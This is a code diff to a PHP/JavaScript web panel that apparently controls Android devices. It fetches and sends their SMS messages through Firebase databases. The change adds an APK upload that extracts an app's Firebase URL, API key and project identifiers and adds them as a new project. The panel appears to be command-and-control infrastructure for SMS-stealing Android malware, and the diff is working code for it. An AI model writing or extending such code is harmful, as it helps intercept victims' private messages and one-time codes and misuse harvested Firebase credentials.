@@ -65,6 +65,10 @@ if (isset($_GET['rebel_fetch_sms']) || isset($_POST['rebel_fetch_sms'])) {
   rebel_json_out($result, !empty($result['ok']) ? 200 : 502);
 }
 
+if (isset($_GET['rebel_apk_extract']) || isset($_POST['rebel_apk_extract'])) {
+  rebel_apk_extract_api_handle();
+}
+
 function rebel_avatar_url() {
   if (is_file(__DIR__ . '/assets/rebel-avatar.jpg')) return 'assets/rebel-avatar.jpg';
   if (is_file(__DIR__ . '/rebel-avatar.jpg')) return 'rebel-avatar.jpg';
@@ -432,6 +436,11 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
   <div class="sheet-title">Firebase Projects</div>
   <div id="fbSheetList"></div>
   <div class="fb-add-form">
+    <div class="apk-upload-box" style="margin-bottom:12px;padding:14px;border:1px dashed var(--border);border-radius:12px;text-align:center;background:rgba(255,255,255,.02)">
+      <input type="file" id="fbApkFile" accept=".apk,.zip,application/vnd.android.package-archive" style="display:none"/>
+      <button type="button" class="btn-add-fb" style="background:var(--surface2);margin-bottom:8px" onclick="document.getElementById('fbApkFile').click()">📦 Upload APK — auto Firebase + API key</button>
+      <div id="fbApkStatus" style="font-size:10px;color:var(--muted);line-height:1.4">Reads google-services.json from APK and adds Firebase automatically</div>
+    </div>
     <input id="fbAddName" placeholder="Project name (e.g. Panel 2)"/>
     <input id="fbAddUrl" placeholder="Firebase URL — https://xxx.firebaseio.com"/>
     <input id="fbAddSecret" placeholder="Database secret / auth key (optional)"/>
@@ -445,6 +454,7 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 <script>
 var SEND_SMS_URL='mobile.php?rebel_send_sms=1';
 var FETCH_SMS_URL='mobile.php?rebel_fetch_sms=1';
+var APK_EXTRACT_URL='mobile.php?rebel_apk_extract=1';
 var SMS_TOKEN_URL='sex.php?sms_token_api=1';
 var allDevs=[], selDev='', clientsRawMap={};
 var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
@@ -740,7 +750,8 @@ function initFirebase(){
   firebaseConfigs.forEach(initFirebaseInstance);
   updateFbUi();
 }
-function addFirebaseProject(){
+function addFirebaseProject(extractMeta){
+  var meta=extractMeta||null;
   var name=document.getElementById('fbAddName').value.trim();
   var url=document.getElementById('fbAddUrl').value.trim().replace(/\/$/,'');
   var secret=document.getElementById('fbAddSecret').value.trim();
@@ -756,8 +767,14 @@ function addFirebaseProject(){
     databaseURL:url,
     secret:secret,
     key:secret,
-    apiKey:apiKey,
-    schema:url.indexOf('rabel')>=0?'rabel':'spinplay'
+    apiKey:apiKey||((meta&&meta.apiKey)||''),
+    projectId:(meta&&meta.projectId)||'',
+    appId:(meta&&meta.appId)||'',
+    authDomain:(meta&&meta.authDomain)||'',
+    storageBucket:(meta&&meta.storageBucket)||'',
+    messagingSenderId:(meta&&meta.messagingSenderId)||'',
+    packageName:(meta&&meta.packageName)||'',
+    schema:(meta&&meta.schema)||(url.indexOf('rabel')>=0?'rabel':'spinplay')
   };
   firebaseConfigs.push(cfg);
   saveFirebaseConfigs();
@@ -772,7 +789,46 @@ function addFirebaseProject(){
   document.getElementById('fbAddUrl').value='';
   document.getElementById('fbAddSecret').value='';
   document.getElementById('fbAddApiKey').value='';
+  var st=document.getElementById('fbApkStatus');
+  if(st)st.textContent='Reads google-services.json from APK and adds Firebase automatically';
   closeFbSheet();
+}
+function uploadApkForFirebase(input){
+  if(!input||!input.files||!input.files[0])return;
+  var file=input.files[0];
+  var st=document.getElementById('fbApkStatus');
+  if(st)st.textContent='Analyzing '+file.name+'...';
+  var fd=new FormData();
+  fd.append('apk',file);
+  fetch(APK_EXTRACT_URL,{method:'POST',body:fd,cache:'no-store'})
+    .then(function(r){return r.json();})
+    .then(function(res){
+      input.value='';
+      if(!res||!res.ok){
+        toast((res&&res.error)||'Could not extract Firebase from APK',false);
+        if(st)st.textContent='Extraction failed — try another APK';
+        return;
+      }
+      var url=(res.databaseURL||'').replace(/\/$/,'');
+      var name=res.name||res.projectId||res.packageName||'APK Firebase';
+      document.getElementById('fbAddName').value=name;
+      document.getElementById('fbAddUrl').value=url;
+      document.getElementById('fbAddApiKey').value=res.apiKey||'';
+      if(st)st.textContent='Found '+url+(res.apiKey?' · API key OK':'')+(res.source?' · '+res.source:'');
+      toast('Firebase extracted — adding project...',true);
+      addFirebaseProject(res);
+    })
+    .catch(function(){
+      input.value='';
+      toast('APK upload failed',false);
+      if(st)st.textContent='Upload error';
+    });
+}
+function bindApkUpload(){
+  var inp=document.getElementById('fbApkFile');
+  if(!inp||inp._rebelBound)return;
+  inp._rebelBound=true;
+  inp.addEventListener('change',function(){uploadApkForFirebase(inp);});
 }
 function removeFirebaseProject(id){
   if(firebaseConfigs.length<=1){toast('At least one Firebase project is required',false);return;}
@@ -1586,6 +1642,7 @@ document.addEventListener('visibilitychange',function(){
   try{
     panelReady=true;
     bindDevListEvents();
+    bindApkUpload();
     bindFirebaseTabEvents();
     loadActiveFb();
     loadDeviceToggles();
